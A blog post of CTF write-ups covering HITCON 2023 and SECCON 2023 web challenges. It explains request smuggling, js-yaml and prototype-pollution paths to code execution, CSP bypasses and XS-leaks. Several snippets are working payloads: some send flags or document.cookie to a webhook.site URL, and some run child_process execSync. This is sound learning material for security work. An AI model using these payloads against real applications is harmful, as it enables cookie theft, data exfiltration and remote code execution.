---
title: HITCON CTF 2023 and SECCON CTF 2023 Writeup
date: 2023-09-23 15:40:00
catalog: true
tags: [Security]
categories: [Security]
photos: /img/hitcon-seccon-ctf-2023-writeup/cover-en.png
---

Both of these competitions had many interesting but challenging problems. I really learned a lot.

Keyword list:

1. nim json, null byte
2. nim request smuggling
3. js-yaml
4. web worker
5. blob URL
6. meta redirect
7. file protocol & .localhost domain
8. sxg: Signed Exchanges
9. 431 CSP bypass
10. DOM clobbering document.body
11. ejs delimiter
12. Node.js + Deno prototype pollution gadget
13. XSleaks golang sort

<!-- more -->
## HITCON CTF 2023

Recently, it seems rare to see web challenges with less than 10 solves for each problem. The last time I saw such a competition was probably DiceCTF. However, I think the difficulty is secondary. The main point is to have fun, find it interesting, and learn new things. These problems, in my opinion, clearly achieved that.

First, here are the write-ups from two authors.

1. [https://blog.splitline.tw/hitcon-ctf-2023-challenges-zh_tw/](https://blog.splitline.tw/hitcon-ctf-2023-challenges-zh_tw/)
2. [https://github.com/maple3142/My-CTF-Challenges/#hitcon-ctf-2023](https://github.com/maple3142/My-CTF-Challenges/#hitcon-ctf-2023)

Both authors wrote detailed write-ups. Here, I will just record some key points after reading them.

### Login System (7 solves)

This challenge has two servers: one in Node.js and the other in Nim. Basically, most of the functionality is implemented in the Nim server. You can log in, register, and change passwords. User data is stored in a YAML file, and the goal is to achieve RCE (Remote Code Execution).

The first vulnerability is request smuggling. Node.js accepts `Transfer-Encoding: CHUNKED`, but Nim only looks at the `chunk`. This difference can be exploited for smuggling purposes.

But what can be done after smuggling?

The second vulnerability is related to Nim's behavior with JSON. By setting a field to a very large number, Nim treats it as a `RawNumber`. When updating, it won't include quotes. This can be used for JSON injection.

The third vulnerability is that, with JSON injection, you can use the functionality of js-yaml to create an object with a JS function. Finally, by calling `toString` on this object during rendering, RCE can be achieved.

It would look something like this:

``` js
privilegeLevel: {
  toString: !<tag:yaml.org,2002:js/function> "function (){console.log('hi')}"
}
access: {'profile': true, register: true, login: true}
```

Oh, by the way, there is another vulnerability related to Nim's file reading. The filename can be truncated using a null byte: `test.yaml\u0000`

### Canvas (4 solves)

This challenge is very interesting!

In simple terms, it throws your code into a worker to execute it. Inside the worker, there are some protective measures that prevent you from accessing `globalThis`. Even if you manage to get XSS within the worker, the only thing you can do is post a message to the main thread. However, the result goes through `setHTML` and is filtered by the browser's Sanitizer API.

The worker's sandbox is quite interesting. It looks something like this:

``` js
function allKeys(obj) {
  let keys = []
  while (obj !== null) {
    keys = keys.concat(Object.getOwnPropertyNames(obj))
    keys = keys.concat(Object.keys(Object.getOwnPropertyDescriptors(obj)))
    obj = Object.getPrototypeOf(obj)
  }
  return [...new Set(keys)]
}

function hardening() {
  const fnCons = [function () {}, async function () {}, function* () {}, async function* () {}].map(
    f => f.constructor
  )
  for (const c of fnCons) {
    Object.defineProperty(c.prototype, 'constructor', {
      get: function () {
        throw new Error('Nope')
      },
      set: function () {
        throw new Error('Nope')
      },
      configurable: false
    })
  }
  const cons = [Object, Array, Number, String, Boolean, Date, RegExp, Promise, Symbol, BigInt].concat(fnCons)
  for (const c of cons) {
    Object.freeze(c)
    Object.freeze(c.prototype)
  }
}

const code = `console.log(1)`
const argNames = allKeys(globalThis)
const fn = Function(...argNames, code)
const callUserFn = t => {
  try {
    fn.apply(Object.create(null))
  } catch (e) {
    console.error('User function error', e)
  }
  return true
}

// hardening
hardening()
callUserFn()
```

`argNames` collects the names of everything that `global` can access. This way, all the names can be treated as function parameters. It feels something like this:

``` js
function run(console, Object, String, Number, fetch,...) {
    
}
```

So, no matter what you get, it will be `undefined`. When calling, `this` is also passed as `Object.create(null)`, so it's not easy to escape.

Maple's expected solution involves using try-catch and throwing an error to retrieve the value:

``` js
try {
  null.f()
} catch (e) {
  TypeError = e.constructor
}
Error = TypeError.prototype.__proto__.constructor
Error.prepareStackTrace = (err, structuredStackTrace) => structuredStackTrace
try{
  null.f()
} catch(e) {
  const g = e.stack[2].getFunction().arguments[0].target
  if (g) { throw { message: g } }
}
```

He used a similar technique before in the DiceCTF 2022 - undefined challenge.

However, there is an easier solution for this challenge, utilizing the default behavior of `this`, as shown below:

``` js
function a() {
   this.console.log('hello') 
}
a()
```

In JavaScript, when calling a function, the default `this` will be the global object. By using this, you can bypass restrictions.

But what can you do after bypassing the restrictions? It seems that you can't do much in the worker because the main thread's `setHTML` filters the content, and the CSP of this challenge is `default-src 'self' 'unsafe-eval'`.

The key lies in the blob URL. You can create a new HTML using blob and load it. The origin of this new HTML is the same as the original one:

``` js
const u = this.URL.createObjectURL(new this.Blob(['<h1>peko</h1>'], { type: 'text/html' }))
location = u
```

What surprised me about this challenge is that the `<meta>` redirect can also be redirected to a blob URL. So, by combining meta redirect, you can make the top-level page your own HTML and bypass the sanitizer's restrictions.

However, at this point, the CSP is inherited, so you still need to bypass the CSP. Here, you can use `worker.js` again, load it as a regular script, and execute XSS under the main thread.

This challenge is really interesting, and the use of blob is quite clever.

### AMF (4 solves)

I'm a bit lazy to study Python stuff, so I'll leave it for now. The author has written a writeup.

### Harmony (2 solves)

This challenge involves various Electron black magic.

In Chromium, domains ending with `.localhost` are ignored when using the file protocol, for example:

```
// fail
file://www.youtube.com.attacker.com/etc/passwd

// success
file://www.youtube.com.localhost/etc/passwd
```

(I feel like I accidentally came across this code before)

And `file://` is filtered out by DOMPurify, but since the webpage itself is a file, you can change it to use `//` to bypass the check.

Next, `file://` is same-origin in Electron, so after loading your own file, you can access `top.api`.

Finally, by combining some prototype pollution techniques, you can achieve RCE (I didn't study the second half in detail, you can refer to the author's writeup).

### Sharer's World (1 solve)

The key to this challenge is something called SXG: https://web.dev/signed-exchanges/

I had never heard of this before this competition, and it turns out that the reference material on web.dev was available as early as 2021. It seems like I've been lagging behind for too long.

Simply put, SXG allows you to sign a webpage with a certificate. When other websites send this signed resource, the browser treats it as if it is from the certified website.

For example, suppose someone from example.com signs a webpage with their private key, creating an example.sxg file. Then I get this file and put it on my server with the URL: https://huli.tw/example.sxg

When a user visits https://huli.tw/example.sxg, the content will be the previous website, and the URL will become example.com, as if this webpage came directly from example.com.

## SECCON CTF 2023

As a JavaScript enthusiast, I really liked the challenges in this SECCON CTF. They were full of JavaScript. Although I couldn't solve some of the challenges, I still learned a lot.

### Bad JWT (107 solves)

The goal of this challenge is to generate a JWT with `isAdmin: true`. The key lies in the logic of JWT verification:

``` js
const algorithms = {
  hs256: (data, secret) => 
    base64UrlEncode(crypto.createHmac('sha256', secret).update(data).digest()),
  hs512: (data, secret) => 
    base64UrlEncode(crypto.createHmac('sha512', secret).update(data).digest()),
}

const createSignature = (header, payload, secret) => {
  const data = `${stringifyPart(header)}.${stringifyPart(payload)}`;
  const signature = algorithms[header.alg.toLowerCase()](data, secret);
  return signature;
}
```

If `header.alg` is `constructor`, it becomes `const signature = Object(data,secret)`, and the resulting signature becomes a string object that only contains data, ignoring the secret:

``` js
console.log(Object("data", "secret")) // String {'data'}
```

Therefore, you just need to construct a signature that is the same.

For a more detailed writeup, you can refer to: https://github.com/xryuseix/CTF_Writeups/tree/master/SECCON2023

### SimpleCalc (23 solves)

This question allows you to execute arbitrary JavaScript, but you need to use fetch with the X-FLAG header to get the flag. However, it will be blocked by CSP:

```  js
app.use((req, res, next) => {
  const js_url = new URL(`http://${req.hostname}:${PORT}/js/index.js`);
  res.header('Content-Security-Policy', `default-src ${js_url} 'unsafe-eval';`);
  next();
});
```

By creating a response with a header that is too large and embedding it in an iframe, you can obtain a same-origin page without CSP, bypassing CSP:

``` js
var f=document.createElement('iframe');
f.src = `http://localhost:3000/js/index.js?q=${'a'.repeat(20000)}`;
document.body.appendChild(f);
f.onload = () => {    
    f.contentWindow.fetch('/flag', { headers: {'X-FLAG': 'a'}, credentials:'include' })
        .then(res => res.text())
        .then(flag => location='https://webhook.site/2ba35f39-faf4-4ef2-86dd-d85af29e4512?q='+flag)
}
```

Interestingly, using `window.open` does not work. It is said that window.open will redirect the error page to a place like `chrome://error`, so the origin becomes null.

The expected solution for this question is actually a service worker. It can be used under http + localhost to remove the CSP header by relying on the service worker.

Below is @DimasMaulana's exploit:

```py
from urllib.parse import quote

target = "http://localhost:3000"
webhook = "https://webhook.site/9a2fbf03-9a64-49d1-9418-3728945d5e10"
rmcsp = """
self.addEventListener("fetch", (ev) => {
    console.log(ev)
    let headers = new Headers()
    headers.set("Content-Type","text/html")
    if (/\/js\//.test(ev.request.url)){
        ev.respondWith(new Response("<script>fetch('/flag',{headers:{'X-FLAG':'1'},credentials:'include'}).then(async r=>{location='"""+webhook+"""?'+await r.text()})</script>",{headers}))
    }
});
console.log("registered2")
document = {}
document.getElementById = ()=>{return {innerText:"testing"}}
"""

workerUrl = "/js/index.js?expr="+quote(rmcsp)

payload = "navigator.serviceWorker.register('"+workerUrl+"');setInterval(()=>{location='/js/test'},2000)"

print(payload)
payload = target+"/js/..%2f?expr="+quote(payload)
```

### blink (14 solves)

The core code for this question is as follows:

``` js
const createBlink = async (html) => {
  const sandbox = wrap(
    $("#viewer").appendChild(document.createElement("iframe"))
  );

  // I believe it is impossible to escape this iframe sandbox...
  sandbox.sandbox = sandboxAttribute;

  sandbox.width = "100%";
  sandbox.srcdoc = html;
  await new Promise((resolve) => (sandbox.onload = resolve));

  const target = wrap(sandbox.contentDocument.body);
  target.popover = "manual";
  const id = setInterval(target.togglePopover, 400);

  return () => {
    clearInterval(id);
    sandbox.remove();
  };
};
```

It is not possible to bypass the sandbox in the iframe, but the key is the line of code `setInterval(target.togglePopover, 400)`.

If `target.togglePopover` is a string, it can be used as an eval.

And `target` is `sandbox.contentDocument.body`, which can be used to DOM clobber `document.body` with `name`, and then clobber `togglePopover` to complete the task.

```html
<iframe name=body srcdoc="<a id=togglePopover href=a:fetch(`http://webhook.site/2ba35f39-faf4-4ef2-86dd-d85af29e4512?q=${document.cookie}`)></a>"></iframe>
```

### eeeeejs (12 solves)

Unfortunately, I couldn't solve this question even after trying for a long time QQ

The core code for this question is as follows:

``` js
const ejs = require("ejs");

const { filename, ...query } = JSON.parse(process.argv[2].trim());
ejs.renderFile(filename, query).then(console.log);
```

You can control `filename` and `query`, and the goal is XSS.

The CSP is set to self, which means that as long as you create `<script src=/>` and construct a valid JS code, you can get the flag.

But another limitation here is that you can only read files under `src`, so your template is limited.

The solution is to use EJS options `openDelimiter`, `closeDelimiter`, and `delimiter` to let EJS parse the template in different ways.

Because in EJS, `<%=` can output the content followed by it, and `<%-` can output unescaped content. So my initial idea was to find a string that matches this pattern, but I only found half of it in the end. I could create `<script>`, but the attribute content would be encoded. I also found a valid way to generate JavaScript. In short, I couldn't solve it in the end.

After the competition, when I looked at other people's solutions, I realized that I forgot that this question calls node.js to output. The author's solution is to set debug to true, which allows EJS to output src, and src will include the filename. Then you can use the property of the filename object to pass in any content.

Alternatively, you can directly put `console.log(src)` into the template.

For example, there is a piece of text as follows:

``` js
  if (opts.debug) {
    console.log(src);
  }
  if (opts.compileDebug && opts.filename) {
    src = src + "\n//# sourceURL=" + sanitizedFilename + "\n";
  }
  // other codes
```

After doing this:

``` js
ejs.renderFile('test', {
  'src': {
    helllo: 'world'
  },
  settings: {
    'view options': {
      delimiter: ' ',
      openDelimiter: 'if (opts.debug)',
      closeDelimiter: " if (opts.compileDebug && opts.filename)"
    }
  }
}).then(r => console.log(r));
```

The output will be:

```
{ helllo: 'world' }
   {
    src = src + "\n//# sourceURL=" + sanitizedFilename + "\n";
  }
  // other codes
```

The reason for this is that after changing the delimiter, the above text is equivalent to:

``` js
<% {
    console.log(src);
  } %> {
    src = src + "\n//# sourceURL=" + sanitizedFilename + "\n";
  }
  // other codes
```

Therefore, it is equivalent to executing `console.log(src)`, so src will appear in the output.

### node-ppjail (5 solves)

This question allows you to pollute things on the prototype, and the value can be a function, but the problem is that you cannot pollute existing properties.

The solution is to trigger an error and then find out what the Node.js  will do, and then pollute the corresponding properties.

A simple example is:

``` js
Object.prototype.prepareStackTrace = function(){
  console.log('pwn')
}
Object.toString.arguments
```

The output is:

```
pwn
/js/pp.js:4
Object.toString.arguments
                ^

[TypeError: 'caller', 'callee', and 'arguments' properties may not be accessed on strict mode functions or the arguments objects for calls to them]

Node.js v20.0.0
```

As for how to find this attribute, it seems like a good choice to patch V8 by learning from [maple](https://blog.maple3142.net/2023/09/17/seccon-ctf-2023-quals-writeups/#sandbox).

The author has found two other methods, which are recorded here for future reference. The source is the [author's writeup](https://blog.arkark.dev/2023/09/21/seccon-quals/):

``` py
def solve1() -> str:
    # Solution 1:
    return json.dumps({
        "__proto__": {
            # ref. https://github.com/nodejs/node/blob/v20.6.0/lib/internal/fixed_queue.js#L81
            # ref. https://github.com/nodejs/node/blob/v20.6.0/lib/internal/process/task_queues.js#L77
            "1": {
                "callback": {
                    "__custom__": True,
                    "type": "Function",
                    "args": [
                        f"console.log(global.process.mainModule.require('child_process').execSync('{command}').toString())"
                    ],
                },
            },
        },
    })


def solve2() -> str:
    # Solution 2:
    return json.dumps({
        "__proto__": {
            # ref. https://github.com/nodejs/node/blob/v20.6.0/lib/internal/util/inspect.js#L1064
            "circular": {
                "get": {
                    "__custom__": True,
                    "type": "Function",
                    "args": [
                        f"console.log(global.process.mainModule.require('child_process').execSync('{command}').toString())"
                    ],
                },
            },
            # ref. https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Error/cause
            "cause": 1,
        },
        # Cause an error
        "toString": {
            "caller": {},
        },
    })
```

### deno-ppjail (2 solves)

Similar to the previous question, but this time we need to find a gadget for deno.

The gadget that the author found is `Object.prototype.return`.

Maple found `cause + circular.get`, and @parrot409 found `nodeProcessUnhandledRejectionCallback`.

For more detailed explanations, you can refer to maple's writeup: https://blog.maple3142.net/2023/09/17/seccon-ctf-2023-quals-writeups/#deno-ppjail

### hidden-note (1 solve)

This challenge is also interesting. It belongs to the type of XS leaks. There is a search function, but the search results filter out the flag.

The search result page can leak information through meta redirect, so we can see the result page. However, the flag has been removed from the result page. What else can we do?

During the search, the results are sorted first, and then the flag is removed. The sorting method used in this question is a stable sort when the number of elements is <= 12, and an unstable sort when the number of elements is > 12.

Therefore, we can create exactly 12 notes with the content: `ECCON{@|ECCON{a|ECCON{b|...`

Suppose the flag is `SECCON{abc}`. When searching for `ECCON{@`, because the total number is 12, it is a stable sort, and the order of the IDs on the search result page will not change.

But if we search for `ECCON{a`, the result becomes 13, and it becomes an unstable sort, changing the order of the notes.

Therefore, by examining the content of the result page, we can determine whether the original search result was within 12 or more than 12, and use it as an oracle to leak the flag.

This solution is really cool and innovative! Both Ark, who created the challnenge, and maple, who solved it, are really amazing.
